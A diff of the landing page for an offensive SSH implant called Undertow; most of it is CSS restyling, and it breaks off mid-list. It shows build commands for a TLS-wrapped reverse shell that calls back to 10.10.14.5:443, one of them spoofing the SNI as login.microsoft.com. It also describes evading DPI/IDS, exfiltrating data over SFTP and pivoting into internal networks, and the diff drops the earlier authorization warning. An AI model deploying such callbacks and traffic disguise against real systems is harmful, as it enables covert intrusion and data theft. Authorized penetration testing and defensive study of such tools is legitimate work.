@@ -3,639 +3,386 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Undertow — Stealth SSH Server for Penetration Testing</title>
-    <meta name="description" content="Statically-linked SSH server for penetration testing. Reverse shells, bind shells, SFTP, port forwarding, and TLS wrapping in a single static binary under 1.5MB.">
+    <title>Undertow — SSH Server That Hides in Plain Sight</title>
+    <meta name="description" content="Statically-linked SSH server for penetration testing. Reverse shells, bind shells, SFTP, port forwarding, and TLS wrapping with SNI spoofing. Under 1.5MB. Go.">
+    <link rel="icon" type="image/svg+xml" href="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 32 32'%3E%3Ctext x='16' y='24' text-anchor='middle' font-family='Inter,sans-serif' font-size='24' font-weight='800' fill='%2374c7ec'%3EU%3C/text%3E%3C/svg%3E">
     <link rel="preconnect" href="https://fonts.googleapis.com">
     <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
     <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&family=JetBrains+Mono:wght@400;500;600;700&display=swap" rel="stylesheet">
     <style>
-        :root {
-            --red: #f38ba8;
-            --maroon: #eba0ac;
-            --pink: #f5c2e7;
-            --mauve: #cba6f7;
-            --lavender: #b4befe;
-            --blue: #89b4fa;
-            --sapphire: #74c7ec;
-            --sky: #89dceb;
-            --teal: #94e2d5;
-            --green: #a6e3a1;
-            --yellow: #f9e2af;
-            --peach: #fab387;
-            --text: #cdd6f4;
-            --subtext1: #bac2de;
-            --subtext0: #a6adc8;
-            --overlay2: #9399b2;
-            --overlay1: #7f849c;
-            --overlay0: #6c7086;
-            --surface2: #585b70;
-            --surface1: #45475a;
-            --surface0: #313244;
-            --base: #1e1e2e;
-            --mantle: #181825;
-            --crust: #11111b;
+        *{margin:0;padding:0;box-sizing:border-box}
+        :root{
+            --accent1:#74c7ec;--accent2:#b4befe;--accentmid:#89b4fa;
+            --accentrgb:116,199,236;
+            --text:#cdd6f4;--sub1:#bac2de;--sub0:#a6adc8;
+            --ov2:#9399b2;--ov1:#7f849c;--ov0:#6c7086;
+            --sf2:#585b70;--sf1:#45475a;--sf0:#313244;
+            --base:#1e1e2e;--mantle:#181825;--crust:#11111b;
+            --green:#a6e3a1;--yellow:#f9e2af;--red:#f38ba8;
+            --peach:#fab387;--mauve:#cba6f7;--teal:#94e2d5;
         }
+        body{font-family:'Inter',system-ui,sans-serif;background:var(--crust);color:var(--text);line-height:1.7;overflow-x:hidden}
+        ::selection{background:rgba(var(--accentrgb),0.3);color:var(--text)}
+        .container{max-width:1140px;margin:0 auto;padding:0 28px}
+        code{font-family:'JetBrains Mono',monospace;background:var(--mantle);padding:2px 7px;border-radius:3px;font-size:.88em;color:var(--green)}
 
-        * { margin: 0; padding: 0; box-sizing: border-box; }
-
-        body {
-            font-family: 'Inter', -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif;
-            background: var(--base);
-            color: var(--text);
-            line-height: 1.7;
-            overflow-x: hidden;
-        }
-
-        body::before {
-            content: '';
-            position: fixed;
-            inset: 0;
-            background-image: radial-gradient(circle, var(--overlay0) 1px, transparent 1px);
-            background-size: 24px 24px;
-            opacity: 0.15;
-            pointer-events: none;
-            z-index: -1;
-        }
-
-        body::after {
-            content: '';
-            position: fixed;
-            inset: 0;
-            background: repeating-linear-gradient(0deg, rgba(0,0,0,0.1), rgba(0,0,0,0.1) 1px, transparent 1px, transparent 2px);
-            pointer-events: none;
-            z-index: 999;
-            opacity: 0.4;
-        }
-
-        ::selection { background: rgba(180, 190, 254, 0.3); color: var(--text); }
-
-        code {
-            font-family: 'JetBrains Mono', monospace;
-            background: var(--mantle);
-            padding: 2px 7px;
-            border-radius: 3px;
-            font-size: 0.88em;
-            color: var(--green);
-        }
-
-        .container { max-width: 1140px; margin: 0 auto; padding: 0 28px; }
+        /* ── Nav ── */
+        .nav{position:fixed;top:0;left:0;right:0;height:56px;background:rgba(17,17,27,0.8);backdrop-filter:blur(12px);-webkit-backdrop-filter:blur(12px);border-bottom:1px solid rgba(49,50,68,0.5);z-index:1000;display:flex;align-items:center;justify-content:center}
+        .nav-inner{max-width:1140px;width:100%;padding:0 28px;display:flex;align-items:center;justify-content:space-between}
+        .nav-logo{font-family:'Inter',sans-serif;font-size:16px;font-weight:700;color:var(--text);text-decoration:none}
+        .nav-links{display:flex;align-items:center;gap:28px}
+        .nav-links a{font-size:13px;font-weight:500;color:var(--ov0);text-decoration:none;transition:color .2s}
+        .nav-links a:hover{color:var(--text)}
+        .nav-cta{background:linear-gradient(135deg,var(--accent1),var(--accentmid));color:var(--crust);padding:7px 18px;border-radius:8px;font-size:13px;font-weight:600;text-decoration:none;transition:box-shadow .2s,transform .2s}
+        .nav-cta:hover{box-shadow:0 0 20px rgba(var(--accentrgb),0.3);transform:translateY(-1px)}
 
         /* ── Hero ── */
-        .hero {
-            padding: 100px 0 70px;
-            text-align: center;
-            position: relative;
-        }
-
-        .hero::after {
-            content: '';
-            position: absolute;
-            bottom: 0;
-            left: 10%;
-            right: 10%;
-            height: 1px;
-            background: linear-gradient(90deg, transparent, var(--surface1), transparent);
-        }
-
-        .hero-logo {
-            width: 420px;
-            max-width: 85%;
-            margin: 0 auto 32px;
-            display: block;
-        }
-
-        .hero-tagline {
-            font-size: 1.35rem;
-            font-weight: 700;
-            color: var(--text);
-            margin-bottom: 16px;
-        }
-
-        .hero-desc {
-            font-size: 1.02rem;
-            color: var(--subtext0);
-            max-width: 620px;
-            margin: 0 auto 28px;
-            line-height: 1.8;
-        }
-
-        .hero-warning {
-            display: inline-block;
-            background: rgba(243, 139, 168, 0.08);
-            border: 1px solid rgba(243, 139, 168, 0.2);
-            border-radius: 8px;
-            padding: 10px 20px;
-            font-size: 0.82rem;
-            color: var(--subtext0);
-            margin-bottom: 32px;
-        }
-
-        .hero-warning strong { color: var(--red); }
-
-        /* Stats */
-        .stats {
-            display: flex;
-            gap: 12px;
-            justify-content: center;
-            flex-wrap: wrap;
-            margin-bottom: 32px;
-        }
-
-        .stat {
-            display: flex;
-            align-items: center;
-            gap: 8px;
-            background: var(--surface0);
-            border: 1px solid var(--surface1);
-            border-radius: 20px;
-            padding: 6px 16px;
-            font-family: 'JetBrains Mono', monospace;
-            font-size: 0.78rem;
-            color: var(--subtext1);
-        }
-
-        .stat-dot {
-            width: 8px;
-            height: 8px;
-            border-radius: 50%;
-        }
-
-        /* CTAs */
-        .ctas {
-            display: flex;
-            gap: 12px;
-            justify-content: center;
-            flex-wrap: wrap;
-        }
-
-        .cta {
-            display: inline-flex;
-            align-items: center;
-            gap: 8px;
-            padding: 10px 24px;
-            border-radius: 8px;
-            font-family: 'JetBrains Mono', monospace;
-            font-size: 0.85rem;
-            font-weight: 600;
-            text-decoration: none;
-            transition: all 0.2s;
-        }
-
-        .cta-primary {
-            background: linear-gradient(135deg, var(--sapphire), var(--lavender));
-            color: var(--crust);
-        }
-
-        .cta-primary:hover { transform: translateY(-2px); box-shadow: 0 8px 24px rgba(180, 190, 254, 0.2); }
-
-        .cta-secondary {
-            background: var(--surface0);
-            color: var(--text);
-            border: 1px solid var(--surface1);
-        }
-
-        .cta-secondary:hover { border-color: var(--lavender); color: var(--lavender); }
-
-        /* ── Sections ── */
-        .section {
-            padding: 80px 0;
-            position: relative;
-        }
-
-        .section::before {
-            content: '';
-            position: absolute;
-            top: 0;
-            left: 10%;
-            right: 10%;
-            height: 1px;
-            background: linear-gradient(90deg, transparent, var(--surface1), transparent);
-        }
-
-        .section-label {
-            font-family: 'JetBrains Mono', monospace;
-            font-size: 0.75rem;
-            font-weight: 600;
-            text-transform: uppercase;
-            letter-spacing: 3px;
-            color: var(--lavender);
-            margin-bottom: 8px;
-        }
-
-        .section-title {
-            font-size: 2rem;
-            font-weight: 700;
-            margin-bottom: 12px;
-            background: linear-gradient(135deg, var(--text), var(--subtext0));
-            -webkit-background-clip: text;
-            -webkit-text-fill-color: transparent;
-            background-clip: text;
-        }
-
-        .section-desc {
-            font-size: 1rem;
-            color: var(--overlay2);
-            max-width: 600px;
-            margin-bottom: 40px;
-        }
-
-        /* ── Features Grid ── */
-        .features-grid {
-            display: grid;
-            grid-template-columns: repeat(auto-fit, minmax(320px, 1fr));
-            gap: 16px;
-            margin-bottom: 24px;
-        }
-
-        .feature-card {
-            background: var(--mantle);
-            border: 1px solid var(--surface0);
-            border-radius: 12px;
-            padding: 24px;
-            transition: all 0.25s;
-        }
-
-        .feature-card:hover {
-            border-color: var(--surface1);
-            transform: translateY(-2px);
-            box-shadow: 0 8px 32px rgba(0,0,0,0.2);
-        }
-
-        .feature-card h3 {
-            font-size: 1rem;
-            font-weight: 600;
-            margin-bottom: 8px;
-            color: var(--text);
-        }
-
-        .feature-card p {
-            font-size: 0.88rem;
-            color: var(--overlay2);
-            line-height: 1.7;
-        }
-
-        /* ── Pills ── */
-        .pills {
-            display: flex;
-            flex-wrap: wrap;
-            gap: 8px;
-        }
-
-        .pill {
-            background: var(--surface0);
-            border: 1px solid var(--surface1);
-            border-radius: 20px;
-            padding: 5px 14px;
-            font-family: 'JetBrains Mono', monospace;
-            font-size: 0.75rem;
-            color: var(--subtext0);
-            transition: all 0.2s;
-        }
-
-        .pill:hover { border-color: var(--lavender); color: var(--lavender); }
-
-        /* ── Architecture ── */
-        .arch-grid {
-            display: grid;
-            grid-template-columns: repeat(auto-fit, minmax(240px, 1fr));
-            gap: 12px;
-        }
-
-        .arch-card {
-            background: var(--mantle);
-            border: 1px solid var(--surface0);
-            border-radius: 10px;
-            padding: 20px;
-        }
-
-        .arch-card h4 {
-            font-family: 'JetBrains Mono', monospace;
-            font-size: 0.85rem;
-            font-weight: 600;
-            margin-bottom: 6px;
-        }
-
-        .arch-card p {
-            font-size: 0.82rem;
-            color: var(--overlay2);
-            line-height: 1.6;
-        }
+        .hero{padding:140px 0 80px;text-align:center;position:relative}
+        .hero::before{content:'';position:absolute;top:60px;left:50%;transform:translateX(-50%);width:800px;height:400px;background:radial-gradient(ellipse,rgba(var(--accentrgb),0.08) 0%,transparent 60%);pointer-events:none}
+        .hero-logo{position:relative;max-width:600px;margin:0 auto 32px}
+        .hero-logo img{width:100%;height:auto}
+        .hero-tagline{position:relative;font-size:clamp(24px,3.5vw,38px);font-weight:700;line-height:1.2;margin-bottom:16px;background:linear-gradient(135deg,var(--accent1),var(--accent2));-webkit-background-clip:text;-webkit-text-fill-color:transparent;background-clip:text}
+        .hero-desc{position:relative;font-size:16px;color:var(--ov0);max-width:560px;margin:0 auto 32px}
+        .hero-ctas{position:relative;display:flex;gap:12px;justify-content:center;margin-bottom:48px}
+        .btn-primary{background:linear-gradient(135deg,var(--accent1),var(--accentmid));color:var(--crust);padding:12px 28px;border-radius:8px;font-family:'JetBrains Mono',monospace;font-size:13px;font-weight:600;text-decoration:none;transition:box-shadow .2s,transform .2s}
+        .btn-primary:hover{box-shadow:0 0 24px rgba(var(--accentrgb),0.35);transform:translateY(-2px)}
+        .btn-secondary{background:var(--sf0);color:var(--text);padding:12px 28px;border-radius:8px;border:1px solid var(--sf1);font-family:'JetBrains Mono',monospace;font-size:13px;font-weight:500;text-decoration:none;transition:all .2s}
+        .btn-secondary:hover{background:var(--sf1);border-color:var(--sf2)}
 
         /* ── Terminal ── */
-        .terminal {
-            background: var(--mantle);
-            border: 1px solid var(--surface0);
-            border-radius: 12px;
-            overflow: hidden;
-            margin-bottom: 16px;
-        }
+        .terminal{position:relative;max-width:800px;margin:0 auto;background:var(--mantle);border:1px solid var(--sf0);border-radius:12px;overflow:hidden;box-shadow:0 8px 40px rgba(0,0,0,0.5),0 0 24px rgba(var(--accentrgb),0.06)}
+        .terminal-bar{background:var(--crust);padding:12px 16px;display:flex;align-items:center;gap:8px;border-bottom:1px solid var(--sf0)}
+        .terminal-dot{width:12px;height:12px;border-radius:50%}
+        .terminal-dot:nth-child(1){background:var(--red)}
+        .terminal-dot:nth-child(2){background:var(--yellow)}
+        .terminal-dot:nth-child(3){background:var(--green)}
+        .terminal-label{flex:1;text-align:center;font-family:'JetBrains Mono',monospace;font-size:11px;color:var(--ov0)}
+        .terminal-body{padding:24px;font-family:'JetBrains Mono',monospace;font-size:13px;line-height:1.9;text-align:left}
+        .terminal-body pre{margin:0;white-space:pre-wrap;word-wrap:break-word}
+        .t-g{color:var(--green)}.t-b{color:var(--accent1)}.t-m{color:var(--sub0)}.t-p{color:var(--peach)}
 
-        .terminal-header {
-            background: var(--surface0);
-            padding: 10px 16px;
-            display: flex;
-            align-items: center;
-            gap: 8px;
-        }
+        /* ── Stats ── */
+        .stats{display:flex;justify-content:center;gap:40px;padding:60px 0;position:relative}
+        .stat{text-align:center}
+        .stat-num{font-family:'JetBrains Mono',monospace;font-size:36px;font-weight:700;color:var(--accent1);line-height:1}
+        .stat-label{font-family:'JetBrains Mono',monospace;font-size:11px;color:var(--sf2);margin-top:6px;letter-spacing:2px;text-transform:uppercase}
+        .stat-div{width:1px;height:48px;background:var(--sf0);align-self:center}
 
-        .terminal-dot {
-            width: 10px;
-            height: 10px;
-            border-radius: 50%;
-        }
+        /* ── Sections ── */
+        section{padding:80px 0}
+        .section-label{font-family:'JetBrains Mono',monospace;font-size:11px;font-weight:600;color:var(--accent1);letter-spacing:3px;text-transform:uppercase;margin-bottom:12px}
+        .section-title{font-size:clamp(28px,4vw,40px);font-weight:700;margin-bottom:12px;letter-spacing:-.02em}
+        .section-desc{font-size:15px;color:var(--ov0);margin-bottom:48px;max-width:560px}
+        .gradient-line{height:1px;background:linear-gradient(90deg,transparent,var(--accent1),var(--accent2),transparent);margin:0 auto;max-width:600px}
 
-        .terminal-title {
-            font-family: 'JetBrains Mono', monospace;
-            font-size: 0.75rem;
-            color: var(--overlay2);
-            margin-left: 8px;
-        }
+        /* ── Bento ── */
+        .bento{display:grid;grid-template-columns:repeat(3,1fr);gap:16px}
+        .bento-card{background:var(--mantle);border:1px solid var(--sf0);border-radius:12px;padding:28px;transition:all .25s;position:relative;overflow:hidden}
+        .bento-card::before{content:'';position:absolute;top:0;left:0;right:0;height:2px;background:linear-gradient(90deg,var(--accent1),var(--accent2));opacity:0;transition:opacity .25s}
+        .bento-card:hover{transform:translateY(-3px);border-color:var(--sf1);box-shadow:0 12px 32px rgba(0,0,0,0.25),0 0 20px rgba(var(--accentrgb),0.06)}
+        .bento-card:hover::before{opacity:1}
+        .bento-hero{grid-column:span 2}
+        .bento-card h3{font-family:'JetBrains Mono',monospace;font-size:14px;font-weight:600;color:var(--accent1);margin-bottom:8px}
+        .bento-card p{font-size:13.5px;color:var(--sub0);line-height:1.6}
+        .bento-card .mini-terminal{background:var(--crust);border-radius:8px;padding:14px;margin-top:14px;font-family:'JetBrains Mono',monospace;font-size:12px;line-height:1.8;text-align:left}
+        .bento-stat{display:flex;flex-direction:column;align-items:center;justify-content:center;text-align:center}
+        .bento-stat .big{font-family:'JetBrains Mono',monospace;font-size:42px;font-weight:700;color:var(--accent1)}
+        .bento-stat .label{font-size:12px;color:var(--sf2);margin-top:4px;letter-spacing:1px}
 
-        .terminal-body {
-            padding: 20px;
-            font-family: 'JetBrains Mono', monospace;
-            font-size: 0.82rem;
-            line-height: 1.9;
-            color: var(--subtext1);
-            overflow-x: auto;
-        }
+        /* ── Pills ── */
+        .pills{display:grid;grid-template-columns:repeat(auto-fill,minmax(160px,1fr));gap:10px}
+        .pill{background:var(--mantle);border:1px solid var(--sf0);border-radius:20px;padding:9px 18px;font-family:'JetBrains Mono',monospace;font-size:12px;display:flex;align-items:center;gap:8px;transition:all .2s;color:var(--sub0)}
+        .pill:hover{border-color:var(--sf1);background:var(--base)}
+        .dot{width:7px;height:7px;border-radius:50%;flex-shrink:0}
+        .dot-g{background:var(--green)}.dot-y{background:var(--yellow)}.dot-n{background:var(--sf2)}
 
-        .terminal-body .comment { color: var(--overlay0); }
-        .terminal-body .cmd { color: var(--green); }
-        .terminal-body .flag { color: var(--lavender); }
-        .terminal-body .string { color: var(--peach); }
-        .terminal-body .prompt { color: var(--overlay0); }
+        /* ── Arch ── */
+        .arch-grid{display:grid;grid-template-columns:repeat(2,1fr);gap:16px}
+        .arch-card{background:var(--mantle);border:1px solid var(--sf0);border-radius:12px;padding:28px;transition:border-color .2s}
+        .arch-card:hover{border-color:var(--sf1)}
+        .arch-num{display:inline-flex;width:30px;height:30px;background:linear-gradient(135deg,var(--accent1),var(--accentmid));color:var(--crust);border-radius:50%;align-items:center;justify-content:center;font-weight:700;font-size:14px;margin-bottom:14px}
+        .arch-card h3{font-family:'JetBrains Mono',monospace;font-size:14px;font-weight:600;color:var(--teal);margin-bottom:8px}
+        .arch-card p{font-size:13.5px;color:var(--sub0);line-height:1.6}
+
+        /* ── Two Col ── */
+        .two-col{display:grid;grid-template-columns:1fr 1fr;gap:20px}
+
+        /* ── Detection ── */
+        .detect-card{background:var(--mantle);border-radius:12px;padding:28px}
+        .detect-card h3{font-size:14px;margin-bottom:14px;display:flex;align-items:center;gap:8px}
+        .detect-card ul{list-style:none;font-size:13px;color:var(--sub0);line-height:2.2}
+        .detect-hidden{border-left:3px solid var(--green)}.detect-hidden h3{color:var(--green)}
+        .detect-visible{border-left:3px solid var(--yellow)}.detect-visible h3{color:var(--yellow)}
 
         /* ── Footer ── */
-        .footer {
-            border-top: 1px solid var(--surface0);
-            padding: 48px 0;
-            text-align: center;
-        }
+        footer{padding:48px 0;margin-top:40px}
+        .footer-line{height:1px;background:linear-gradient(90deg,transparent,var(--accent1),var(--accent2),transparent);margin-bottom:48px}
+        .footer-grid{display:grid;grid-template-columns:repeat(4,1fr);gap:32px}
+        .footer-grid h4{font-family:'JetBrains Mono',monospace;font-size:11px;color:var(--text);margin-bottom:14px;letter-spacing:2px;text-transform:uppercase}
+        .footer-grid ul{list-style:none}
+        .footer-grid li{margin-bottom:8px}
+        .footer-grid a{color:var(--ov2);text-decoration:none;font-size:13px;transition:color .2s}
+        .footer-grid a:hover{color:var(--accent1)}
+        .footer-grid p{font-size:13px;color:var(--ov1);line-height:1.7}
+        .footer-bottom{text-align:center;margin-top:36px;padding-top:24px;border-top:1px solid var(--sf0);font-size:12px;color:var(--ov0)}
 
-        .footer-links {
-            display: flex;
-            gap: 24px;
-            justify-content: center;
-            flex-wrap: wrap;
-            margin-bottom: 16px;
-        }
+        /* ── Animate ── */
+        .animate{opacity:0;transform:translateY(24px);transition:opacity .6s ease,transform .6s ease}
+        .animate.visible{opacity:1;transform:translateY(0)}
+        .animate-scale{opacity:0;transform:translateY(24px) scale(.97);transition:opacity .8s ease,transform .8s ease}
+        .animate-scale.visible{opacity:1;transform:translateY(0) scale(1)}
 
-        .footer-links a {
-            font-family: 'JetBrains Mono', monospace;
-            font-size: 0.8rem;
-            color: var(--overlay2);
-            text-decoration: none;
-            transition: color 0.2s;
-        }
+        /* ── Responsive ── */
+        @media(max-width:960px){.bento{grid-template-columns:1fr 1fr}.bento-hero{grid-column:span 2}.two-col,.arch-grid{grid-template-columns:1fr}.footer-grid{grid-template-columns:repeat(2,1fr)}.stats{flex-wrap:wrap;gap:24px}}
+        @media(max-width:600px){.container{padding:0 16px}.hero{padding:100px 0 48px}.bento{grid-template-columns:1fr}.bento-hero{grid-column:span 1}.stats{gap:16px}.stat-div{display:none}.nav-links a:not(.nav-cta){display:none}.footer-grid{grid-template-columns:1fr}.pills{grid-template-columns:repeat(auto-fill,minmax(140px,1fr))}}
 
-        .footer-links a:hover { color: var(--lavender); }
-
-        .footer-toolkit {
-            font-size: 0.78rem;
-            color: var(--overlay0);
-            margin-bottom: 8px;
-        }
-
-        .footer-toolkit a {
-            color: var(--overlay1);
-            text-decoration: none;
-        }
-
-        .footer-toolkit a:hover { color: var(--lavender); }
-
-        .footer-brand {
-            font-family: 'JetBrains Mono', monospace;
-            font-size: 0.72rem;
-            color: var(--surface2);
-        }
-
-        .footer-brand a {
-            color: var(--lavender);
-            text-decoration: none;
-        }
-
-        @media (max-width: 768px) {
-            .hero { padding: 60px 0 50px; }
-            .hero-logo { width: 280px; }
-            .section-title { font-size: 1.5rem; }
-            .features-grid { grid-template-columns: 1fr; }
-            .arch-grid { grid-template-columns: 1fr 1fr; }
-        }
-
-        @media (max-width: 480px) {
-            .arch-grid { grid-template-columns: 1fr; }
-        }
+        a:focus-visible{outline:2px solid var(--accent1);outline-offset:2px}
     </style>
 </head>
 <body>
 
-    <!-- ══ Hero ══ -->
+    <!-- Nav -->
+    <nav class="nav"><div class="nav-inner">
+        <a href="#" class="nav-logo">Undertow</a>
+        <div class="nav-links">
+            <a href="#features">Features</a>
+            <a href="#architecture">Architecture</a>
+            <a href="https://github.com/Real-Fruit-Snacks/Undertow">GitHub</a>
+            <a href="https://github.com/Real-Fruit-Snacks/Undertow/releases/latest" class="nav-cta">Download</a>
+        </div>
+    </div></nav>
+
+    <!-- Hero -->
     <section class="hero">
         <div class="container">
-            <img src="assets/logo-dark.svg" alt="Undertow" class="hero-logo">
-
-            <p class="hero-tagline">Stealth SSH Server for Penetration Testing</p>
-
-            <p class="hero-desc">
-                Reverse shells, bind shells, SFTP file transfer, and full SSH port forwarding in a single static binary under 1.5MB. Optional TLS wrapping hides SSH inside HTTPS to evade DPI/IDS on the wire.
-            </p>
-
-            <div class="hero-warning">
-                <strong>Authorization Required:</strong> This tool is designed exclusively for authorized security testing with explicit written permission.
+            <div class="hero-logo animate"><img src="https://raw.githubusercontent.com/Real-Fruit-Snacks/Undertow/main/docs/assets/logo-dark.svg" alt="Undertow"></div>
+            <h1 class="hero-tagline animate" style="transition-delay:.1s">SSH server that hides in plain sight</h1>
+            <p class="hero-desc animate" style="transition-delay:.2s">Statically-linked SSH server. Reverse and bind shells, SFTP file transfer, port forwarding, and TLS wrapping with SNI spoofing. Under 1.5MB. Go.</p>
+            <div class="hero-ctas animate" style="transition-delay:.3s">
+                <a href="https://github.com/Real-Fruit-Snacks/Undertow/releases/latest" class="btn-primary">Download Latest</a>
+                <a href="https://github.com/Real-Fruit-Snacks/Undertow" class="btn-secondary">View Source</a>
             </div>
+            <div class="terminal animate-scale" style="transition-delay:.4s">
+                <div class="terminal-bar">
+                    <span class="terminal-dot"></span><span class="terminal-dot"></span><span class="terminal-dot"></span>
+                    <span class="terminal-label">undertow</span>
+                </div>
+                <div class="terminal-body"><pre><span class="t-m"># Build a reverse shell with TLS wrapping</span>
+<span class="t-g">$</span> ./build.sh reverse 10.10.14.5:443 --tls
+<span class="t-b">[+] Mode:     reverse</span>
+<span class="t-b">[+] Target:   10.10.14.5:443</span>
+<span class="t-b">[+] TLS:      enabled</span>
+<span class="t-b">[+] Binary:   bin/undertow-10-10-14-5-443-linux-x64 (1.4MB)</span>
+<span class="t-b">[+] Handler:  bin/handler-10-10-14-5-443</span>
 
-            <div class="stats">
-                <div class="stat"><span class="stat-dot" style="background: var(--green)"></span> Single Static Binary</div>
-                <div class="stat"><span class="stat-dot" style="background: var(--lavender)"></span> &lt; 1.5 MB</div>
-                <div class="stat"><span class="stat-dot" style="background: var(--sapphire)"></span> Linux + Windows</div>
-                <div class="stat"><span class="stat-dot" style="background: var(--mauve)"></span> TLS Wrapping</div>
-                <div class="stat"><span class="stat-dot" style="background: var(--teal)"></span> SFTP Built-in</div>
-            </div>
-
-            <div class="ctas">
-                <a href="https://github.com/Real-Fruit-Snacks/Undertow" class="cta cta-primary">View on GitHub</a>
-                <a href="https://github.com/Real-Fruit-Snacks/Undertow#quick-start" class="cta cta-secondary">Quick Start</a>
+<span class="t-m"># Start the handler on your machine</span>
+<span class="t-g">$</span> ./bin/handler-10-10-14-5-443
+<span class="t-p">Listening on 0.0.0.0:443 (TLS)...</span>
+<span class="t-p">Connection from 10.10.10.5:48372</span>
+<span class="t-b">ssh -p 2222 svc@127.0.0.1  # password: aB3kX9mW</span></pre></div>
             </div>
         </div>
     </section>
 
-    <!-- ══ Features ══ -->
-    <section class="section">
-        <div class="container">
-            <div class="section-label">Features</div>
-            <h2 class="section-title">Everything in One Binary</h2>
-            <p class="section-desc">Full SSH server capabilities -- interactive shells, file transfer, tunneling, and evasion -- compiled into a single zero-dependency binary.</p>
+    <!-- Stats -->
+    <div class="container">
+        <div class="stats animate">
+            <div class="stat"><div class="stat-num" data-suffix="MB" data-target="1" data-prefix="<">0</div><div class="stat-label">Binary</div></div>
+            <div class="stat-div"></div>
+            <div class="stat"><div class="stat-num" data-target="2">0</div><div class="stat-label">Platforms</div></div>
+            <div class="stat-div"></div>
+            <div class="stat"><div class="stat-num" data-suffix="" data-target="0" data-prefix="TLS">0</div><div class="stat-label">Wrapping</div></div>
+            <div class="stat-div"></div>
+            <div class="stat"><div class="stat-num" data-suffix="" data-target="0" data-prefix="SFTP">0</div><div class="stat-label">Built-in</div></div>
+        </div>
+        <div class="gradient-line"></div>
+    </div>
 
-            <div class="features-grid">
-                <div class="feature-card">
-                    <h3>Interactive PTY Shell</h3>
-                    <p>Full PTY support with Ctrl+C, tab completion, and command history. Linux uses creack/pty, Windows 10+ uses ConPTY. No more fighting with raw netcat shells.</p>
+    <!-- Features Bento -->
+    <section id="features">
+        <div class="container">
+            <div class="section-label animate">FEATURES</div>
+            <h2 class="section-title animate" style="transition-delay:.08s">Everything in a single binary</h2>
+            <p class="section-desc animate" style="transition-delay:.16s">Reverse and bind shells. TLS wrapping. SFTP. Port forwarding. Handler scripts. Under 1.5MB static binary.</p>
+
+            <div class="bento">
+                <div class="bento-card bento-hero animate" style="transition-delay:.1s">
+                    <h3>TLS Wrapping</h3>
+                    <p>Wraps SSH inside TLS with ALPN negotiation and SNI spoofing. On the wire it looks like HTTPS to any destination you choose. The SSH banner never appears in plaintext.</p>
+                    <div class="mini-terminal"><span class="t-g">$</span> ./build.sh reverse 10.10.14.5:443 --tls --sni login.microsoft.com<br><span class="t-b">[+] TLS: enabled | SNI: login.microsoft.com</span><br><span class="t-b">[+] ALPN: h2, http/1.1</span></div>
                 </div>
-                <div class="feature-card">
-                    <h3>Reverse & Bind Modes</h3>
+                <div class="bento-card bento-stat animate" style="transition-delay:.18s">
+                    <div class="big">&lt;1.5<span style="font-size:24px">MB</span></div>
+                    <div class="label">Static Binary</div>
+                </div>
+                <div class="bento-card animate" style="transition-delay:.2s">
+                    <h3 style="color:var(--mauve)">Reverse / Bind Modes</h3>
                     <p>Reverse mode dials home through firewalls. Bind mode listens on target. Both support the full SSH feature set -- PTY, SFTP, and port forwarding work identically.</p>
                 </div>
-                <div class="feature-card">
-                    <h3>SFTP File Transfer</h3>
+                <div class="bento-card animate" style="transition-delay:.28s">
+                    <h3 style="color:var(--green)">SFTP</h3>
                     <p>Built-in SFTP subsystem for file transfer. Upload tools, download loot, exfiltrate data -- all through the same SSH connection. No separate channel needed.</p>
                 </div>
-                <div class="feature-card">
-                    <h3>Port Forwarding</h3>
-                    <p>Local, remote, and dynamic SOCKS port forwarding. Pivot through the target to reach internal networks, expose services, or tunnel traffic.</p>
+                <div class="bento-card animate" style="transition-delay:.36s">
+                    <h3 style="color:var(--peach)">Port Forwarding</h3>
+                    <p>Local, remote, and dynamic SOCKS forwarding. Pivot through the target to reach internal networks, expose services, or tunnel traffic through SSH.</p>
                 </div>
-                <div class="feature-card">
-                    <h3>TLS Wrapping</h3>
-                    <p>Optional TLS wrapping with ALPN negotiation and SNI spoofing. On the wire it looks like HTTPS -- the SSH banner never appears in plaintext.</p>
+                <div class="bento-card bento-stat animate" style="transition-delay:.1s">
+                    <div class="big" style="color:var(--teal)">2</div>
+                    <div class="label">Platforms</div>
                 </div>
-                <div class="feature-card">
-                    <h3>Handler Scripts</h3>
-                    <p>Build script auto-generates a handler that starts the listener, displays credentials, and shows the SSH command when a callback arrives.</p>
+                <div class="bento-card bento-hero animate" style="transition-delay:.18s">
+                    <h3 style="color:var(--red)">Handler Scripts</h3>
+                    <p>Build script auto-generates a handler that starts the listener, displays credentials, and shows the SSH command when a callback arrives. Zero manual setup.</p>
+                    <div class="mini-terminal"><span class="t-g">$</span> ./bin/handler-10-10-14-5-443<br><span class="t-p">Listening on 0.0.0.0:443 (TLS)...</span><br><span class="t-p">Connection from 10.10.10.5:48372</span><br><span class="t-b">ssh -p 2222 svc@127.0.0.1</span></div>
+                </div>
+                <div class="bento-card animate" style="transition-delay:.26s">
+                    <h3 style="color:var(--yellow)">PTY Support</h3>
+                    <p>Full interactive PTY on Linux via creack/pty. Windows 10+ uses ConPTY. Tab completion, Ctrl+C passthrough, job control. No raw netcat shells.</p>
+                </div>
+                <div class="bento-card animate" style="transition-delay:.34s">
+                    <h3 style="color:var(--teal)">Catppuccin Theme</h3>
+                    <p>Build script outputs with Catppuccin Mocha colors. Status messages, progress indicators, and handler output all use the palette.</p>
                 </div>
             </div>
+        </div>
+    </section>
 
+    <!-- Capabilities -->
+    <section style="background:var(--mantle)">
+        <div class="container">
+            <div class="section-label animate">CAPABILITIES</div>
+            <h2 class="section-title animate" style="transition-delay:.08s">Platform support</h2>
+            <p class="section-desc animate" style="transition-delay:.16s">Full-featured on Linux and Windows. Static binary with zero dependencies. Optional UPX compression.</p>
             <div class="pills">
-                <span class="pill">Reverse Shell</span>
-                <span class="pill">Bind Shell</span>
-                <span class="pill">SFTP</span>
-                <span class="pill">Local Forwarding</span>
-                <span class="pill">Remote Forwarding</span>
-                <span class="pill">SOCKS Proxy</span>
-                <span class="pill">TLS Wrapping</span>
-                <span class="pill">SNI Spoofing</span>
-                <span class="pill">ALPN Negotiation</span>
-                <span class="pill">ConPTY</span>
-                <span class="pill">creack/pty</span>
-                <span class="pill">ED25519 Auth</span>
-                <span class="pill">Password Auth</span>
-                <span class="pill">UPX Compression</span>
-                <span class="pill">Handler Scripts</span>
-                <span class="pill">IPv6</span>
